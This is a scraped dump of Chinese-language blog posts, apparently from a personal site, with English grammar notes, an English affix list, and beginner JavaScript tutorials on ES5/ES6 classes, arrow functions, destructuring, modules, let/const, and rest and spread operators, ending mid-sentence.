對等連接詞 連結詞連接的兩端必須對等（字和字、片語和片語、句子和句子） and but or nor for so yey Edward is kind and courageous.（形容詞）She is a loving mother and a loyal friend.（片語）Betty lived life fully and completely.（副詞） 動名詞 / 原形動詞放在句首動名詞放句首當作「主詞」Drinking enought water every day is very important.每天喝足夠的水是非常重要的。 Drinking enought water every day is very important 主詞 時間副詞 動詞 補語 原形動詞放句首當作「祈使句」Take an unbrella with you. It seems as if it’s going to rain.帶把雨傘吧，看起來好像要下雨了。 Take an unbrella with you It seems as if it’s going to rain. 動詞 主詞 連綴動詞 連接詞 獨立子句 參考資料【老師救救我】為什麼句子的開頭是原形動詞？ 關於長句懶人包 合句（獨立子句 + 獨立子句） 複句（獨立子句 + 從屬子句） 複合句（獨立子句 + 獨立子句 + 從屬子句） 例子： I drink plenty of fruit juice, I get a plenty of sleep.我喝了一堆果汁，我獲得充足的睡眠。獨立子句”I drink plenty of fruit juice”與獨立子句”I get a plenty of sleep.” Even though I feel like crying, 儘管我有想哭的感覺，我仍用笑容來掩飾一切。從屬子句”Even though I feel like crying”與獨立子句”I hide it with a smile.” You can sign your kids up for piano lessons, but if they are forced to do it, they won’t practice much.你可以幫你的小孩報名鋼琴課，但如果他們是被強迫參加的，它們就不會多練習。獨立子句”You can sign your kids up for piano lessons”與複句”if they are forced to do it, they won’t practice much” 經由對等連接詞 but 連結，形成複合句。 複句必須使用以下兩種連接詞來連接一個從屬子句 從屬連接詞（前後句子有絕對關係） because、since、after、although、when 關係代名詞（主要在形容前面的主詞）that、who、which、whoever、whichever 關於子句 獨立子句 從屬子句 獨立子句意思完整，可以單獨存在。 I am coding.我正在打碼。 She is playing a game.她正在玩遊戲。 The boss is debugging.老闆正在除錯。 從屬子句意思不完整，不能單獨存在，需要另外一個獨立子句來讓句子完整。 While I was debugging.當我正在除錯的時後。 Because you miss a “white-speace”.因為你漏了一個”空白字元”。 Although she has finished the feature.儘管她完成了這項功能。 參考資料【你的句子有幾個字】拉長句子的妙方：子句 will 與 be going to 差異做決定的時機will → 講話的當下才決定 be going to → 早就已經決定 時間的長度will → 長遠的未來 be going to → 短期的未來 對未來的預測will → 偏向猜測、意見 be going to → 從現實推導出比較有根據、有把握的未來 承諾、幫忙用 willI’m going to Singapore on business this weekend. Will you help me look after my dog?這個周末我要去新加坡出差，你可以幫我照顧我的狗嗎？ No problem. I will help you.沒問題，我會幫你照顧她 如果變成…No problem. I’m going to help you.沒問題，我正要去幫忙你 未來的事實用 willThe sum will rise tomorrow.太陽明天依舊會升起 如果變成…The sum is going to rise tomorrow.太陽明天正要升起（代表有時太陽不會升起一樣） 參考資料【易混淆】別再混用了！will-跟-going-其實不一樣！ either 的各種用法either 「也」（否定） 當作 adv 使用 需以 and 連接 放在句尾（逗號後方的句子） She can’t speak English well, and I can’t either.他的英文不太流利，我也一樣。 either 「兩者之中任何一個」 當作 代名詞 使用（代跟在後面的那個名詞） 若名詞前有 所有格（The, These, Those），either 需在加上 of either 本身視為單數，故動詞要注意型態 Either of us needs to wash the dishes.我們之中有人得去洗碗。 either 「兩者之中任何一個; 兩者的」 當作 限定詞 使用 後面的名詞須為 單數可數 You can take either road, both roads will lead you to my house.兩條路你都可以走，都會通到我家。 I once studied German and Spanish, but I’ve forgotten either one.我學過德文與西班牙文，但我已經忘光光了。 either A or B 「不是 A 就是 B」 當作 對等連接詞 使用 通常和 or 一起使用 We will meet each other either this week or next week.我們不是這禮拜就是下禮拜見面。 She’s not going to marry either Tom or Jerry.他不會跟 Tom 或 Jerry 結婚 Either we leave for Jenny’s house now or we may miss the party.我們要不就現在出發去 Jenny 家，要不就是錯過派對。 參考資料「either」和「neither」正確用法是？來看例句搞懂！ made of 與 made fromas 的各種用法as long as 只要… as long as A, B… 如果 A 事件發生了，那麼 B 事件就能夠實現 可代換成 so long as 當作連接詞使用，可以放句首 / 句中。 You can go out as long as you finish your homewrok.只要你做完作業就可以出門了 As long as you love me, I don’t care how much money you have.只要你愛我，我不在乎你有多少錢 As long as I have you, nothing else is matters.只要我擁有你，那什麼事都不重要了 As long as the weather is good next weekend, we will go hiking.只要下個周末天氣好，我們就會去健行。 as soon as 一…就 as soon as A, B A 發生後，接著 B 馬上跟著發生 當作連接詞使用，可以放句首 / 句中。 The baby stopped crying as soon as she saw her mother.那個小嬰兒一見到媽媽之後就不哭了。 Damn it! As soon as I walked out of my house, it started to rain.該死！我一踏出家門，就開始下雨了 As soon as Jennifer graduated from high school, her family moved to California.Jennifer 一從高中畢業，他們全家就搬去了加州。 The meeting will begin as soon as the boss shows up.老闆一出現，這場會議就會開始了。 as far asas far as 提到、談到（某人某物） 接名詞 / 動名詞 As far as my resume談到我的履歷 As far as performing pooh提到表演小熊維尼 as far as 達到…的程度; 達到…的距離（地點） 後面接名詞 I’ve read as far as the fifth chapter, but I still need to read three more chapters.我已經讀到第四章了，但我還有三個章節得讀。 After you reach the summit, I suggest you go as far as the old castle. It’s worth visiting.你攻頂之後，我建議你再走遠一點到古堡那，那裏很值得一訪。 as far as (someting) is concerned 關於某事物As far as the budget is concerned, the company decided to sponsor our event.關於預算的部分，那家公司決定贊助我們的活動了 As far as speaking English is concerned, Ruby is doing pretty well. However, she should improve her writting.在英文口說方面，Ruby 做得很好，不過，他應該要改善寫作能力。 參考資料「as」正確用法是？來搞懂 as 的 6 大用法！（含例句） as if彷彿的意思。 參考資料英文 As If 用法(Usage Of As If In English) since 的各種用法自從 當作從屬連接詞 可以接一個時間點 可以接一個完整的句子 從過去某個時間開始，就一直持續著。 I have lived in Taiwan since last year.我從去年開始住在台灣。 I have learned to code since I was a child.在我還小的時候，我就已經在學習打碼了。 既然、因為 當作從屬連接詞 跟 beacuse 的用法不同，since 代表的是「顯而易見、大家都知道的情況」。 Since you can’t answer my question, I will ask someone else.既然你沒辦法回答我的問題，我會去問別人。 Since we have sometime, we can walk around and take some pictures.既然我們還有一點時間，我們可以去附近走走、拍些照片。 從此、此後 當作副詞使用，通常放句尾 She left last night and I haven’t seen her since.他昨晚離開後，我從此就再也沒見過她。 Her son died two years ago and he has rarely spoken to people since.她的兒子兩年前去世了，從此以後她就很少跟人說話。 ever since 從那之後 當作從屬連接詞，但語氣比 since 更強調。 Ever since I was a student, I have wanted to write scripts.從我還是學生時，我就一直想寫劇本。 Jim has worked for his company ever since he graduated from colledge.Jim 畢業後就一直在這間公司工作。 long since 早就 當作副詞，通常放動詞前來修飾動詞。 I have long since forgiven him for what he did.我早就已經原諒他的所作所為。 since when 從什麼時候開始 當作副詞使用 有憤怒、質問、修幹的語氣 Since when do you really care about me?從什麼時候開始，你開始在乎我了？ Since when have you become so radical?從什麼時候開始，你變得如此偏激？ Consider 的用法consider + N. 考慮某項事物 We should consider his age.我們應該考慮他的年紀。 Please consider our proposal.請考慮我們的提案。 consider + Ving 考慮做某件事 She was considering visiting her frirends in italy.她當時正在考慮去見她在義大利的朋友。 I’ve never considered quitting my job.我從來沒有考慮辭職。 consider + O. + (to be) … 把…當作、認為…是、把…視為 She considers him to be her Mr. Right.她把他當作是她的真命天子。 I consider the Netherlands to be one of my favorite contries.我認為尼爾蘭當作是我最喜歡的國家之一。 Mary considers herself fortunate.Mary 認為她自己很幸運。 be V. + considered + to be / to do 被認為是（被動語態） Einstein is considered to be a genius.愛因斯坦被認為是天才。 Anne Hathaway is considered to have beautiful eyes.Anne Hathaway 被認為擁有美麗的雙眼。 consider + N + as 有爭議性（可以改用 regard 來代替 / 或省略 as） 視…為 as 可省略 They should consider this as a long-term plan.= They should consider this a long-term plan.他們應該要把這個視為一個長期的計畫。 I consider him as my best friend.= I consider him my best friend.我把她視為我最好的朋友 consider wh- + to do + 子句 接 who, what, how 等等 考慮… Have you consider where to go next?你有考慮接下來要去哪裡了嗎？ He is considering how to deal with the problem.他正在考慮要如何解決這個問題。 They are considering what they will do tomorrow.他們正在考慮明天要做什麼。 consider (that) 考慮到… I hadn’t even consider that she might not want go to the party.我都還沒考慮到她可能不會想去派對。 You have to consider that he just moved to a new country.你應該要考慮到他才剛搬到一個新的國家。 all things consider 總體來說、考慮到所有的因素 All things consider, it was a great party.總體來說，這是一場很棒的派對。 All things consider, I’d rather be in Taiwan.考慮到所有的因素，我寧願留在台灣。 considering 表示「考慮」 類似 regarding 的介係詞用法 接名詞 Considering her age, she’s quite outgoing.考慮到他的年紀，他還蠻外向的。 He did quite well on his exam considering the circumstances.考慮到這些情況，他在考試上的表現很不賴。 considering that 表示「考慮到…」 此處作為複合連接詞，所以後面要接「句子」（別跟 considering + N.搞混） that 可省略 Considering (that) he’s only just started learning English, he speaks the language quite well.考慮到他才剛開始學英文，他的英文說的很不賴。 I was immpressed that Ammy could found the way here, considering (that) she’d only been here once before.艾咪能夠找到這裡讓讓我很印象深刻，考慮到他之前只來過這裡一次。 I’ve always consider you as a friend. 參考資料「consider」正確用法是？來看例句搞懂！ If I were … 如果我…代表「假設語氣」，假設語氣的話就要從「I was」 → 「I were」 Rather than是 A…而不是 B（當連接詞時）因為是作為連接詞使用，所以 A 跟 B 的詞性需相等 For exercise, I walk rather than run.（都是 v.）以運動來說，我是走路而不是跑步。 I decided to drink coffee rather than soda.（都是 n.）我選擇喝咖啡而不是汽水。 I would describe wanting as cut rather than hot.（都是 adj.）我會形容 wanting 是可愛而不是火辣。 He talks slowly rather than quickly（都是 adv.）它講話是很慢而不是很快。 不是 A…而是 B（放句首時）如果是接動詞，原型動詞(v)會比動名詞(Ving)來得常見 Rather than ride a bicycle, she walk to work.她不是騎腳踏車而是走路去上班 Rather than watch videos, I read books.我沒有看影片，而是讀書。 Rather than stay at home, she went out for a walk.她沒有待在家，而是出去散步了。 搭配用法 Would rather…than… 表示寧可…也不願… 只能接於原型動詞 前後必須對等 She would rather dance than sing in public.她寧可在公共場合前跳舞也不要唱歌。 He would rather kiss Jane than hug Sandy.她寧可親 Jane 也不要抱 Sandy。 參考資料「rather than」正確用法是？來看例句搞懂！","link":"/2021/07/18/english-note/"},{"title":"單字中的字根首尾","text":"把以前做的筆記搬來這裡。 形容詞字尾 -ive sensitive、exclusive -ic romantic -ent confident、different、dependent -ly lovely、friendly -ty safety、loyalty -ous serious、dangerous、various、famous、delicious -al logical、horizontal、literal、global、denial 名詞字尾 -or actor、doctor -ion situation、function -ian indian、muscian -ure nature、pleasure、culture -ment announcement、enviorment、equipment、detachment -ance distance、balance、instance、enhance -ence sequence、conference、difference、experience -ness business、kindness、weakness -cy transparency、policy 副詞字尾 -ly suddenly、easily、slowly 動詞字尾 -ize apologize、recognize、initalize、optimize -ate create、motivate -fy modify、satisfy、simplify 字根 En- 使成為、放入 Un- 不 Con- 共同、一起 Pri- Prim- Prin 第一的 Fore- 前面的 Hypo- 上面的、超越 Hyper 下面的、低的 hypotention（低血壓） Que- 尋找、詢問","link":"/2021/12/23/english-trick/"},{"title":"ES5 實作物件導向","text":"以前學的做法。 簡述我們先來看結果會長什麼樣，等等再來解釋： 123456789101112131415function Person(name) { this._name = name}Person.prototype.getName = function () { console.log(this._name)}Person.prototype.setName = function (newName) { this._name = newName}const person1 = new Person('PeaNu')const person2 = new Person('PPB')person1.getName() // PeaNuperson2.getName() // PPB 順便幫你複習一下 ES6 的寫法，做個對照： 1234567891011121314151617class Person { constructor(name) { this._name = name } getName() { console.log(this._name) } setName(newName) { this._name = newName }}const person1 = new Person('PeaNu')const person2 = new Person('PPB')person1.getName() // PeaNuperson2.getName() // PPB 關於 constructor可以發現 ES5 寫起來沒有那麼直覺，在沒有 class 時只能把 function 當作 constructor 來用，而且還蹦出一堆 prototype 的東西。 另外為了避免跟普通的 function 搞混，一般會像 class 一樣用「大寫開頭」來區分。再來是很重要的一點，就是 constructor 一定要搭配 new 來使用，不然會沒有作用。 所以說只要你看到 new xxx() 的話一定代表是 call 某個 constructor，而不是 function。 prototype 幹嘛用的？以前我對變數的概念不熟，所以一直不懂 prototype 的實際意義是什麼。但現在熟了以後就很清楚了。 你先想想看，如果不用 prototype 的話會怎樣？ 123456789101112function Person(name) { this._name = name this.getName = function () { console.log(this._name) } this.setName = function (newName) { this._name = newName }}const person1 = new Person('PeaNu')const person2 = new Person('PPB') 看起來好像沒什麼差？但如果執行這段的話會發現： 1console.log(person1.getName === person2.getName) // false 結果是 false，代表這兩個 getName 是兩個不同的 function。不太懂的話再舉個例子： 123456789101112131415function getName1() { console.log('hi')}function getName2() { console.log('hi')}const getNameByReference = getName1getName1() // higetName2() // higetNameByReference() // hiconsole.log(getName1 === getName2) // falseconsole.log(getNameByReference === getName1) // true 這三個 function 都可以正常執行，可是差在哪裡？差在 getName1 和 getName2 是不同的 function，而 getNameByReference 是透過 refer 的方式參考到 getName1，所以 getNameByReference === getName1 才會是true。 回到 prototype 的例子也一樣，如果沒有用 prototype 來做設定的話，每當 new 一個 instance 的時候就會重新宣告一個新的 function，所以比對的結果會是 false，因為它們是不一樣的。 問題很明顯，這樣子很浪費資源，明明每個 function 要做的事情一樣，為什麼不讓它們共用就好？還要幫每一個 instance 都重新宣告一次。 所以 prototype 就誕生了，讓每個 instance 共用同一個 function，就是它的初衷。 至於別人常說 class 是語法糖的原因是因為寫起來比較簡單和直覺，你可以滑上去對比 ES5 和 ES6，就能看到這兩個差別： 直接在 class 裡用 constructor，而不是透過 function declaration 不需要透過 prototype 來綁定，也能達到一樣的效果 所以現在要實作物件導向都會透過 class，比較少在用 prototype，但還是要理解它們背後的涵義。 繼承先來一段範例，複習一下在 ES6 裡面我們是怎麼用 class 來做繼承的。 附註：Admin 會繼承 User 12345678910111213141516171819202122232425262728293031323334class User { constructor(name, email) { this.name = name this.email = email } login() { console.log(`${this.name} has logged in.`) }}class Admin extends User { constructor(permission, ...props) { super(...props) this.permission = permission this.users = [] } addUser(user) { this.users = this.users.map((user) =&gt; ({ ...user })).concat(user) } deleteUser(user) { this.users = this.users.filter((u) =&gt; u.name !== user.name) }}const user1 = new User('peanu', 'peanu@peanu.dev')const user2 = new User('ppb', 'ppb@peanu.dev')const admin = new Admin('root', 'admin', 'admin@peanu.dev')admin.login() // admin has logged inadmin.addUser(user1)admin.addUser(user2)console.log('init users', admin.users) // [user1, user2]admin.deleteUser(admin.users[0]) // delete user1console.log('deleted users', admin.users) // user2 簡單來說，在建立 Admin 時我們會多做兩件事： 用 extends 表示我們想要繼承的那個 class（User） 為了建立新的 property 給 Admin，我們會在 constructor 中使用 super 建立原本 User 中應有的 property。（如果沒有這個需求的話其實可以省略這個步驟） 最後用 Admin 建立的出來的 Instance 就會繼承 User 身上的 property 及 method（name、email 和 login）。 如果變成 ES5 的形式的話會改成這樣： 1234567891011121314151617181920212223242526272829303132333435363738function User(name, email) { this.name = name this.email = email}User.prototype.login = function () { console.log(`${this.name} has logged in`)}function Admin(role, ...args) { // 把 this (物件）丟給 User constructor 建立 property User.apply(this, args) // 建立 Admin 自己的 property this.role = role this.users = []}// 繼承 User.prototype 中的所有 methodAdmin.prototype = Object.create(User.prototype)// 在 Admin.prototype 建立自己的 methodAdmin.prototype.addUser = function (user) { this.users = this.users.map((user) =&gt; ({ ...user })).concat(user)}Admin.prototype.deleteUser = function (user) { this.users = this.users.filter((u) =&gt; u.name !== user.name)}const user1 = new User('peanu', 'peanu@peanu.dev')const user2 = new User('ppb', 'ppb@peanu.dev')const admin = new Admin('root', 'admin', 'admin@peanu.dev')admin.login() // admin has logged inadmin.addUser(user1)admin.addUser(user2)console.log('added users', admin.users) // [user1, user2]admin.deleteUser(admin.users[0])console.log('deleted users', admin.users) // [user2] 拆開語法糖的包裝後： 建立 property 的方式會從 super(...args) 變成 User.apply(this, args) 建立 method 的方式會從 extends User 變成 Admin.prototype = Object.create(User.prototype) 其實背後在做的事情都一樣，只是 ES6 把它包裝成更好看一點而已。","link":"/2022/03/18/es5-oop/"},{"title":"ES6 的箭頭函式","text":"寫起來甜甜的。 好吃的語法糖先看原始的 function： 12345678910let arr = [1, 2, 3, 4, 5]console.log( arr .filter(function(value) { return value &gt; 1 }) .map(function(value) { return value * 2 })) // &nbsp;[4, 6, 8, 10] 再來看箭頭函式： 123456let arr = [1, 2, 3, 4, 5]console.log( arr .filter(value =&gt; value &gt; 1) .map(value =&gt; value * 2)) // &nbsp;[4, 6, 8, 10] 簡單筆記一些注意事項： 只有一個參數的時候才可以省略 ()，value =&gt; value * 2 沒有參數的時候一定要 ()，() =&gt; console.log('hi') 只要加上 {} 就一定要自己寫 return 才會有回傳的效果，value =&gt; { return value * 2 } this 值跟一般的 function 不一樣","link":"/2021/12/25/es6-arrow-function/"},{"title":"ES6 的預設參數值","text":"再也不用擔心 undefined。 function 的用法如果不幫參數用一個預設值的話，再碰到一些 edge case 的時候會比較麻煩一點： 12345678function repeat(str, times) { let result = '' for(let i=0; i&lt;times; i++) { result += str } return result}console.log(repeat('a')) // '' 空字串 （times 會是 undefined 所以不會進入迴圈，最後得到空字串） 加上預設值世界就不一樣了： 12345678function repeat(str = '', times = 1) { let result = '' for(let i=0; i&lt;times; i++) { result += str } return result }console.log(repeat('a')) // a 解構的用法原來這個用法也能搭配解構來用： 1234let arr = [1, 2, 3]let [n1, n2, n3=100, n4 = 'abc'] = arrconsole.log(n3) // 3console.log(n4) // 'abc' 12345678let obj = { a: 1, b: 2, c: 3}let {a, b, c=true, d='ddd'} = objconsole.log(c) // 3console.log(d) // 'ddd'","link":"/2021/12/25/es6-default-parameters/"},{"title":"ES6 的解構賦值","text":"相見恨晚。 過去式以往在對 array 或 object 取值都是像這樣： array： 1234const arr = [1, 2, 3]const n1 = arr[0]const n2 = arr[1]const n3 = arr[2] object： 12345678const obj = { name: 'Peanu', age: 23, address: 'Taiwan',}const name = obj.nameconst age = obj.ageconst address = obj.address 現在式解構的概念很簡單，就是用「對應」的方式來取值，一個變數都會對應到一個 key 或 value。 array： 12const arr = [1, 2, 3]const [n1, n2, n3] = arr 你可以想成是這樣的對應關係： 1const [n1, n2, n3] = [1, 2, 3] object： 123456const obj = { name: 'Peanu', age: 23, address: 'Taiwan',}const {name, age, address} = obj 你可以想成是這樣的對應關係： 12345678910const obj = { name: 'Peanu', age: 23, address: 'Taiwan',}const { name age address} = obj 應該很直覺吧？ 讓我們層層相疊如果解構出來的值是一個 object，那一樣可以再對它解構： 12345678910111213const obj = { name: 'Peanu', age: 23, address: 'Taiwan', wife: { name: 'PPB', age: 24, address: 'Taiwan', }}const { wife } = objconst { name } = wifeconsole.log(name) // PPB 進階－物件的巢狀取值知道一下就好，實務上應該是不常這樣用： 123456789101112const obj = { name: 'Peanu', age: 23, address: 'Taiwan', wife: { name: 'PPB', age: 24, address: 'Taiwan', }}const {wife: {name}} = objconsole.log(name) // PPB 看不懂的話，改用對應的關係來看會好懂很多： 12345678910111213141516const obj = { name: 'Peanu', age: 23, address: 'Taiwan', wife: { name: 'PPB', age: 24, address: 'Taiwan', }}const { wife: { name }} = objconsole.log(name) // PPB 但要注意一下，這種巢狀取值的方式只能取到最裡面那個，如果你這樣用的話會有錯誤： 123456789101112const obj = { name: 'Peanu', age: 23, address: 'Taiwan', wife: { name: 'PPB', age: 24, address: 'Taiwan', }}const {wife: {name}} = objconsole.log(wife) // ReferenceError: wife is not defined Array 當然也能這樣玩： 12const arr = [ 1, 2, [3, 4] ]const [n1, n2, [n3, n4]] = arr 在函式中解構當 function 的預期的參數是 object，可以在定義的時候就先解構： 1234567891011function test({name, age, address}) { console.log(name) console.log(age) console.log(address)}let person = { name: 'PeaNu', age: 23, address: 'Taiwan'}test(person) 當 key / value 相等時可以縮寫1234567const name='peanu', age=20, gender='man';const obj = { name, age, gender}console.log(obj) 解構出來的東西可以重新命名123456789101112const obj = { name: 'peanu', age: 25, gender: 'man'}// 原本的const {name, age , gender} = obj// 重新命名const {name: peanuName, age: peanuAge , gender: peanuGender} = objconsole.log('A:', name, age , gender)console.log('B:', peanuName, peanuAge , peanuGender) 陣列的應用：交換舉個爛例子，假設沒有下雨，我就午餐吃牛肉麵，晚餐吃咖哩飯；反之就倒過來。 但這個技巧是運用變數名稱來替換，並不是真正意義上的那種交換（換位置）。 1234567891011121314let isRaining = falsefunction whatDoYouEatToday(condition) { const meals = ['牛肉麵', '咖哩飯'] // 沒下雨 if(!condition) { const [lunch, dinner] = meals console.log(`午餐--&gt;${lunch}，晚餐--&gt;${dinner}`) // 有下雨 } else { const [dinner, lunch] = meals console.log(`午餐--&gt;${lunch}，晚餐--&gt;${dinner}`) }}whatDoYouEatToday(isRaining)","link":"/2021/12/24/es6-destructuring/"},{"title":"ES6 的模組機制","text":"很亂捏。 懶人包export 只能用變數或命名函式輸出 輸出跟引入的時候可以取別名 引入的時候要用 {}，「解構」的方式取出（可以想成東西都被用物件包起來輸出） export default 後面接什麼就輸出什麼（不會幫你用物件包起來） 一個檔案只能有一個 default 輸出 引入的時候不用 {}，直接自定義名稱 不可以取別名 補充：要在 Node.js 裡面跑的話要記得在 package.json 裡面設定 \"type\": \"module\" 才能正常執行。 補充：要在 Browser 上跑的話要記得這樣寫 1&lt;script type=\"module\"&gt;&lt;/script&gt; 另外要開 Live-server 才有辦法跑，不然會被 CORS 擋住。 export 一個一個輸出輸出： 12345// utils.jsexport function add(a, b) { return a + b}export const PI = 3.14159 引入： 1234// main.jsimport { PI, add } from './utils.js'console.log(PI) // 3.14159 console.log(add(1, 3)) // 4 引入的時候也可以取別的名稱： 1234// main.jsimport { add as ffff, PI as AAA } from './utils.js'console.log(AAA) // 3.14159 console.log(ffff(1, 3)) // 4 如果一個一個引入太麻煩也可以用 * 一次引入成一個 object： 1234// main.jsimport * as yoooo from './utils.js'console.log(yoooo.PI) // 3.14159 console.log(yoooo.add(1, 3)) // 4 export 用物件包住一起輸出輸出： 123456789// utils.jsfunction add(a, b) { return a + b}const PI = 3.14159 export { add, PI} 引入： 1234// main.jsimport { PI, add } from './utils.js'console.log(PI) // 3.14159 console.log(add(1, 3)) // 4 輸出的時候可以取別的名稱： 123456789// utils.jsfunction add(a, b) { return a + b}const PI = 3.14159 export { add as addFunction, PI as AAA} 別忘了引入的時候也要對應起來： 1234// main.jsimport { AAA, addFunction } from './utils.js'console.log(AAA) // 3.14159 console.log(addFunction(1, 3)) // 4 export default輸出一個東西輸出： 12// utils.jsexport default 'yoyoyo' 引入： 123// main.jsimport abc from './utils'console.log(abc) // yoyoyo 輸出多個東西（用物件包）輸入： 12345678// utils.jsfunction add(a, b) { return a + b}export default { add, ggg : 'hello'} 引入： 1234// main.jsimport cool from './utils'console.log(cool.add(1, 2)) // 3console.log(cool.ggg) // hello","link":"/2021/12/25/es6-import-export/"},{"title":"ES Module 的 import 技巧","text":"第一次知道這招！ 簡述有時候有一種檔案是刻意用來當作程式入口點，只負責引入其他檔案，然後輸出。 這時候可能會這樣寫： 123// index.jsimport App from \"./App\"export default App 但其實還可以簡寫成這樣： 12// index.jsexport { default } from \"./App\" 很讚吧！直接把 import 給省略掉了。","link":"/2022/04/10/es6-import-trick/"},{"title":"ES6 的 let 與 const","text":"開始填 ES6 的坑。 let 與 const 的差異let 基本上跟 var 大致上差不多，只差在「作用域」的範圍不同，等一下會解釋什麼是作用域。 const 就比較不一樣了，const 的意思是「Constant」（常數），所以用 const 宣告的變數「值不會改變」，而且在宣告的時候就必須賦值。（畢竟都是常數了，沒有理由宣告的時候不能賦值） let 與 const 的區塊作用域什麼是作用域？簡單來說就是一個「變數的生存範圍」。例如說 var 的作用域就是在 function 的範圍內： 123456function varScope () { var a = 20 console.log(a)}varScope() // 20console.log(a) // ReferenceError: a is not defined 但其實大部分的程式語言是以 block（區塊）來劃分作用域的，所以 JavaScript 算是一個比較特別的案例。 而 let 與 const 的作用域就是在 block 的範圍內： 1234567891011function blockScpoe() { if(true) { let a = 10 const b = 20 console.log(a) // 10 console.log(b) // 20 } console.log(a) // ReferenceError: a is not defined console.log(b) // ReferenceError: b is not defined}blockScpoe() 區塊作用域有什麼好處？你可能會想說這樣子跟用 var 有什麼差嗎？ 其實是有的，因為以 function 來做切割的作用域範圍比較大，會比較容易有「衝突」跟「互相干擾」的問題，看看這個例子： 123456789function abc() { var count = 0 for(var i=0; i&lt;10; i++) { var count = 'ddd' console.log(count) // ddd } console.log(count) // ddd}abc() 先說聲對不起這例子實在有點爛，不過我想表達的是如果你在 for 裡面也剛好宣告一個「跟外面同名稱的變數」，那就會不小心把外面的變數值給覆寫掉。而大部分的情況我們不會希望這種事情發生。 但如果是區塊作用域的話就能避免掉這個問題產生： 123456789function abc() { var count = 0 for(var i=0; i&lt;10; i++) { let count = 'ddd' console.log(count) // ddd } console.log(count) // 0}abc() 所以為了降低這種衝突發生，最好是改用 let 與 const 會是比較好的做法。","link":"/2021/12/24/es6-let-const/"},{"title":"ES6 實作物件導向","text":"俗稱語法糖。 簡述附註： Class 的命名慣例是大頭開頭（蠻重要的） 用來拿物件值的 function 一般會稱為「getter」，設值則稱為「setter」 私有屬性一般會加上 _ 前綴來表示，告訴別人知道沒事不要亂動。（因為還是可以存取的到） 12345678910111213141516171819class Person { // init constructor (name) { this._name = name; } // getter getName () { console.log(this._name); } // setter changeName (newName) { this._name = newName; }}const person1 = new Person('PeaNu');const person2 = new Person('PPB');person1.getName(); // PeaNuperson2.getName(); // PPB 物件導向的原則就是： 先寫好模板 用模板把東西生出來（俗稱 new 一個 instance 出來） 所以上面寫了 Person 這個模板，在透過 new 來把 instance 生出來。 通常在 new 的時候會希望能做些「初始值」的設定，所以就會透過 constructor（建構子）來完成。你也可以想成 new 就是再呼叫 constructor 這種感覺。","link":"/2022/03/18/es6-oop/"},{"title":"ES6 的其餘運算子","text":"又是你。 把你包起來❤跟 展開運算子 87 分像，但差在展開運算子是把 array 或 object 給「拆開來」，其餘運算子是把「沒有殼的 array 或 object」給「包起來」，變成一個 array 或 object。 什麼叫沒有殼的 array 或 object？就是你在用「解構」或是「傳參數到 function」的時候。 舉個解構的例子： 123let arr = [1, 2, 3, 4]let [...rest] = arrconsole.log(rest) // [1, 2, 3, 4] 你可以把它想像成這樣 1let [..rest] = 1, 2, 3, 4 我知道這樣做看起來很脫褲子放屁，但只是方便理解。它的用法是「把剩餘的部分給包起來」： 123let arr = [1, 2, 3, 4]let [n1, n2, ...rest] = arrconsole.log(rest) // [3, 4] 但要注意，rest 必須放在最後面，畢竟它是把「剩下」的東西給集合起來。 object 也是同樣的操作方式： 12345678let obj = { a: 1, b: 2, c: 3}let {a, ...obj2} = objconsole.log(a) // 1 console.log(obj2) // {b: 2, c: 3} 不懂的話，一樣想成「沒有殼的 object」就好： 1234let {a, ...obj2} = a: 1, b: 2, c: 3console.log(a) // 1 console.log(obj2) // {b: 2, c: 3} 搭配 function傳到 function 裡的參數就很像「沒有殼的 array」： 12345function add(a, ...rest) { console.log(a) // 1 console.log(rest) // [2, 3, 4]}add(1, 2, 3, 4) // 沒有殼的 array 搭配解構來用也行： 12345function add([a, ...rest]) { console.log(a) // 1 console.log(rest) // [2, 3, 4]}add([1, 2, 3, 4]) // 改成解構","link":"/2021/12/25/es6-rest-parameters/"},{"title":"ES6 展開運算子","text":"拆拆拆！ 喜歡拆禮物嗎？展開運算子（Spread-Operator），把東西給展開，可以想像是拆禮物的那種感覺 \\(•ㅂ•)/ 原本你在一個 array 裡面放另外一個 array 會變成二維 array： 123const arr = [1, 2, 3]const arr2 = [4, 5, 6, arr]console.log(arr2) // [4, 5, 6, [1, 2, 3]] 但「展開運算子」會直接把內容給展開（打開）： 123const arr = [1, 2, 3]const arr2 = [4, 5, 6, ...arr]console.log(arr2) // [4, 5, 6, 1, 2, 3] 可以想像成是把 [1, 2, 3] 的方括號拿掉的感覺。 搭配 function 還有一個很特別的玩法： 12345function add(a, b, c) { return a + b + c}let arr = [1, 2, 3]add(...arr) // 6 不好懂的話，想成這樣就好理解多了： 12345function add(a, b, c) { return a + b + c}let arr = [1, 2, 3]add(1, 2, 3) // 6 object 也可以展開： 123456789let obj = { a: 1, b: 2}let obj2 = { c: 1, ...obj}console.log(obj2) // {c:1, a: 1, b: 2} 但要注意一下順序的問題，如果有重複的內容，後面的會蓋掉前面的： 123456789101112let obj = { a: 1, b: 2, c: 10}let obj2 = { c: 1, ...obj}// c 會被 obj 給覆寫// {c: 10, a: 1, b: 2, }console.log(obj2) 利用展開運算子拷貝 array 或 object以往我們用 arr1 = arr2 的方式會因為變數的儲存機制導致我們存到的是「記憶體位址」而不是實際上的值。 但改用展開運算子就可以做到複製的動作： array： 1234const arr1 = [1, 2, 3]const arr2 = [...arr1]console.log(arr2) // [1, 2, 3]console.log(arr1 === arr2) // false object： 1234const obj1 = {name: 'PeaNu'}const obj2 = {...obj1}console.log(obj2) // {name: 'PeaNu'}console.log(obj1 === obj2) // false 但是，如果是要複製的 array 跟 object是「巢狀結構」的話要特別注意： 12345const nestedArray = [4]const arr1 = [1, 2, 3, nestedArray]const arr2 = [...arr1]console.log(arr2) // [1, 2, 3, 4]console.log(arr2[3] === arr1[3]) // true 你可以把展開運算子想成是「它只能打開第一層」的這種概念，當我們用 arr2 = [...arr1] 的時候，arr1 的第一層會被拆開，變成 1, 2, 3： 123const arr2 = [...arr1]const arr2 = [[1, 2, 3]] // 拆掉！const arr2 = [1, 2, 3] 但是 nestedArray 因為是第二層，所以不會被拆開： 123const arr2 = [...arr1]const arr2 = [[1, 2, 3, [4]]] // 第二層拆不掉！const arr2 = [1, 2, 3, [4]] 所以 arr1 跟 arr2 裡面的 nestedArray 都沒有被拆開，等於裡面放的都是「同一個 nestedArray」，所以 arr2[3] === arr1[3] 才會等於 true。 object 也會有一樣的行為，簡單做個示範： 12345678const nestedObj = { age: 20 }const obj1 = { name: 'PeaNu', detail: nestedObj} const obj2 = {...obj1}console.log(obj1 === obj2) // falseconsole.log(obj1.detail === obj2.detail) // true 一樣想成這樣子就好： 123456789101112const 